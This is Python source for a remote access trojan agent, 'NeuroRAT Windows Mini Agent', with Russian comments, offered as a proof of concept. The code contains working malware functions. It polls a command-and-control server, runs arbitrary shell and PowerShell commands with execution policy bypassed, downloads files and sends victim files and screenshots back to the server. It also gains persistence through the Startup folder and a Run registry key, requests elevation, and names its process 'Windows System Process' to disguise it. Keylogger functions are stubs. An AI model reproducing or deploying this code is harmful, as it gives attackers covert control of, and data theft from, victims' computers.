#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NeuroRAT Windows Mini Agent - POC
Тестовый агент для проверки соединения с C2 сервером
"""

import os
import sys
import time
import ctypes
import random
import socket
import subprocess
import base64
import platform
import tempfile
import winreg
import shutil
import json
import ssl
import uuid
import logging
from urllib.request import Request, urlopen
from urllib.error import URLError
import threading
import re
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('agent.log'), logging.StreamHandler()]
)
logger = logging.getLogger('win_agent')

# Конфигурация агента
CONFIG = {
    "server_address": "http://localhost:8080",  # C2 сервер
    "agent_id": str(uuid.uuid4())[:8],  # Уникальный ID агента
    "sleep_interval": 5,  # Интервал между запросами к серверу (секунды)
    "jitter": 2,  # Случайное отклонение для интервала сна (секунды)
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "max_retries": 5,  # Максимальное количество попыток соединения
    "persistence": True,  # Установка механизма персистентности
    "encryption_key": "n3ur0r4t_s3cr3t_k3y",  # Ключ для шифрования
}

class WindowsAgent:
    def __init__(self):
        self.config = CONFIG
        self.system_info = self._collect_system_info()
        self.is_admin = self._is_admin()
        
        # Если нет прав админа, попытаемся их получить
        if not self.is_admin and self.config["persistence"]:
            self._attempt_privilege_escalation()
    
    def start(self):
        """Основной метод запуска агента"""
        logger.info(f"Agent {self.config['agent_id']} starting...")
        
        # Устанавливаем персистентность, если включена
        if self.config["persistence"]:
            self._establish_persistence()
        
        # Регистрируемся на сервере
        self._register_with_c2()
        
        # Основной цикл получения команд
        while True:
            try:
                # Получаем команды от сервера
                commands = self._get_commands_from_c2()
                
                # Выполняем полученные команды
                if commands:
                    for cmd in commands:
                        result = self._execute_command(cmd)
                        self._send_result_to_c2(cmd, result)
                
                # Добавляем случайное отклонение (jitter) к интервалу сна
                sleep_time = self.config["sleep_interval"] + random.uniform(0, self.config["jitter"])
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.error(f"Error in main loop: {str(e)}")
                time.sleep(10)  # Пауза перед повторной попыткой
    
    def _register_with_c2(self):
        """Регистрирует агента на C2 сервере"""
        try:
            url = f"{self.config['server_address']}/api/register"
            data = {
                "agent_id": self.config["agent_id"],
                "hostname": self.system_info["hostname"],
                "username": self.system_info["username"],
                "os": self.system_info["os"],
                "ip_address": self.system_info["ip"],
                "is_admin": self.is_admin,
                "system_info": self.system_info
            }
            
            # В реальном сценарии здесь было бы шифрование данных
            headers = {
                "User-Agent": self.config["user_agent"],
                "Content-Type": "application/json"
            }
            
            req = Request(
                url, 
                data=json.dumps(data).encode('utf-8'), 
                headers=headers,
                method="POST"
            )
            
            with urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                logger.info(f"Registration result: {result.get('status', 'unknown')}")
                
            return True
        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return False
    
    def _get_commands_from_c2(self):
        """Получает команды от C2 сервера"""
        try:
            url = f"{self.config['server_address']}/api/agent/{self.config['agent_id']}/tasks"
            headers = {"User-Agent": self.config["user_agent"]}
            
            req = Request(url, headers=headers)
            
            with urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                if result.get("tasks"):
                    return result["tasks"]
            
            return []
        except Exception as e:
            logger.error(f"Error getting commands: {str(e)}")
            return []
    
    def _send_result_to_c2(self, command, result):
        """Отправляет результат выполнения команды на C2 сервер"""
        try:
            url = f"{self.config['server_address']}/api/agent/{self.config['agent_id']}/task_result"
            data = {
                "command": command,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            
            headers = {
                "User-Agent": self.config["user_agent"],
                "Content-Type": "application/json"
            }
            
            req = Request(
                url, 
                data=json.dumps(data).encode('utf-8'), 
                headers=headers,
                method="POST"
            )
            
            with urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                logger.debug(f"Result sent: {result.get('status', 'unknown')}")
                
            return True
        except Exception as e:
            logger.error(f"Error sending result: {str(e)}")
            return False
    
    def _execute_command(self, command):
        """Выполняет полученную команду и возвращает результат"""
        logger.info(f"Executing command: {command}")
        
        # Разбираем параметры команды
        if isinstance(command, dict):
            cmd_type = command.get("type", "shell")
            cmd_args = command.get("args", "")
        else:
            cmd_type = "shell"
            cmd_args = command
        
        # Обрабатываем различные типы команд
        if cmd_type == "shell":
            return self._execute_shell_command(cmd_args)
        elif cmd_type == "download":
            return self._download_file(cmd_args)
        elif cmd_type == "upload":
            return self._upload_file(cmd_args)
        elif cmd_type == "screenshot":
            return self._take_screenshot()
        elif cmd_type == "keylogger_start":
            return self._start_keylogger()
        elif cmd_type == "keylogger_stop":
            return self._stop_keylogger()
        else:
            return f"Unknown command type: {cmd_type}"
    
    def _execute_shell_command(self, command):
        """Выполняет shell-команду и возвращает результат"""
        try:
            # Создаем PowerShell процесс для выполнения команды
            if command.lower().startswith("powershell "):
                command = command[11:]  # Удаляем "powershell " из начала
                powershell_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 
                                            'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                process = subprocess.Popen([powershell_path, "-ExecutionPolicy", "Bypass", "-Command", command],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            else:
                # Для обычных команд используем cmd.exe
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            
            stdout, stderr = process.communicate(timeout=30)
            
            if process.returncode != 0:
                return f"Error (code {process.returncode}): {stderr.decode('utf-8', errors='replace')}"
            
            return stdout.decode('utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def _download_file(self, args):
        """Загружает файл с удаленного сервера"""
        try:
            url = args.get("url")
            destination = args.get("destination")
            
            if not url or not destination:
                return "Missing URL or destination path"
            
            req = Request(url, headers={"User-Agent": self.config["user_agent"]})
            
            with urlopen(req) as response, open(destination, 'wb') as out_file:
                data = response.read()
                out_file.write(data)
            
            return f"File downloaded successfully to {destination}"
        except Exception as e:
            return f"Error downloading file: {str(e)}"
    
    def _upload_file(self, args):
        """Загружает файл на C2 сервер"""
        try:
            source = args.get("source")
            
            if not source or not os.path.exists(source):
                return f"File not found: {source}"
            
            url = f"{self.config['server_address']}/api/agent/{self.config['agent_id']}/upload"
            
            with open(source, 'rb') as in_file:
                file_data = in_file.read()
                file_data_b64 = base64.b64encode(file_data).decode('utf-8')
            
            data = {
                "filename": os.path.basename(source),
                "data": file_data_b64
            }
            
            headers = {
                "User-Agent": self.config["user_agent"],
                "Content-Type": "application/json"
            }
            
            req = Request(
                url, 
                data=json.dumps(data).encode('utf-8'), 
                headers=headers,
                method="POST"
            )
            
            with urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                
            return f"File uploaded successfully: {result.get('status', 'unknown')}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def _take_screenshot(self):
        """Делает скриншот экрана"""
        try:
            # Импортируем PIL для создания скриншота
            from PIL import ImageGrab
            
            screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            
            # Отправляем файл на сервер
            result = self._upload_file({"source": screenshot_path})
            
            # Удаляем временный файл
            try:
                os.remove(screenshot_path)
            except:
                pass
            
            return result
        except ImportError:
            return "Error: PIL library not available. Install with 'pip install pillow'"
        except Exception as e:
            return f"Error taking screenshot: {str(e)}"
    
    def _start_keylogger(self):
        """Стартует кейлоггер в отдельном потоке"""
        # Stub - for actual implementation would require additional libraries
        return "Keylogger functionality not implemented in this demo"
    
    def _stop_keylogger(self):
        """Останавливает кейлоггер"""
        # Stub - for actual implementation would require additional libraries
        return "Keylogger functionality not implemented in this demo"
    
    def _is_admin(self):
        """Проверяет, имеет ли текущий процесс права администратора"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _establish_persistence(self):
        """Устанавливает механизм персистентности в системе"""
        if not self.is_admin:
            logger.warning("Not running as admin, some persistence methods may not work")
        
        try:
            # Копируем текущий файл в папку автозагрузки
            startup_folder = os.path.join(os.environ["APPDATA"], 
                                         "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)
            
            # Имя файла для копирования
            current_exe = sys.executable
            if current_exe.endswith("python.exe") or current_exe.endswith("pythonw.exe"):
                # Если запускаемся из Python, копируем скрипт
                target_path = os.path.join(startup_folder, "system_helper.pyw")
                shutil.copy2(__file__, target_path)
            else:
                # Если запускаемся из EXE, копируем его
                target_path = os.path.join(startup_folder, "system_helper.exe")
                shutil.copy2(current_exe, target_path)
            
            logger.info(f"Established persistence via startup folder: {target_path}")
            
            # Если есть права админа, добавляем и в реестр
            if self.is_admin:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "WindowsSystemHelper", 0, winreg.REG_SZ, target_path)
                winreg.CloseKey(key)
                logger.info("Established persistence via registry")
            
            return True
        except Exception as e:
            logger.error(f"Error establishing persistence: {str(e)}")
            return False
    
    def _attempt_privilege_escalation(self):
        """Пытается повысить привилегии процесса (UAC bypass)"""
        # Этот метод должен реализовать обход UAC
        # Ниже приведен очень простой пример, который не будет работать в реальных условиях
        # В реальном сценарии здесь были бы более продвинутые техники
        
        logger.info("Attempting privilege escalation...")
        
        try:
            # Пример: Запуск CMD с повышенными привилегиями через PowerShell
            # Это потребует подтверждения UAC, но показывает принцип
            if sys.executable.endswith("python.exe") or sys.executable.endswith("pythonw.exe"):
                cmd = f'powershell.exe Start-Process -FilePath "{sys.executable}" -ArgumentList "{__file__}" -Verb RunAs'
            else:
                cmd = f'powershell.exe Start-Process -FilePath "{sys.executable}" -Verb RunAs'
            
            subprocess.Popen(cmd, shell=True)
            # Завершаем текущий процесс без прав
            sys.exit(0)
        except Exception as e:
            logger.error(f"Privilege escalation failed: {str(e)}")
    
    def _collect_system_info(self):
        """Собирает информацию о системе"""
        info = {
            "hostname": socket.gethostname(),
            "username": os.environ.get("USERNAME", "unknown"),
            "os": platform.platform(),
            "ip": self._get_ip_address(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "system_version": platform.version()
        }
        
        # Добавляем информацию о запущенных процессах
        try:
            # В реальном сценарии здесь был бы код для получения списка процессов
            info["running_processes"] = "Not implemented in demo"
        except:
            info["running_processes"] = "Failed to retrieve"
        
        # Добавляем информацию о сетевых адаптерах
        try:
            # В реальном сценарии здесь был бы код для получения сетевой информации
            info["network_adapters"] = "Not implemented in demo"
        except:
            info["network_adapters"] = "Failed to retrieve"
            
        return info
    
    def _get_ip_address(self):
        """Получает IP-адрес хоста"""
        try:
            # Пытаемся получить внешний IP
            with urlopen("https://api.ipify.org") as response:
                ip = response.read().decode('utf8')
                return ip
        except:
            # Если не удалось, возвращаем локальный IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
            except:
                ip = "127.0.0.1"
            finally:
                s.close()
            return ip


# Точка входа
if __name__ == "__main__":
    try:
        # Маскируем процесс
        if hasattr(ctypes, 'windll'):
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Process")
        
        agent = WindowsAgent()
        agent.start()
    except Exception as e:
        logger.error(f"Critical error: {str(e)}")
        sys.exit(1) 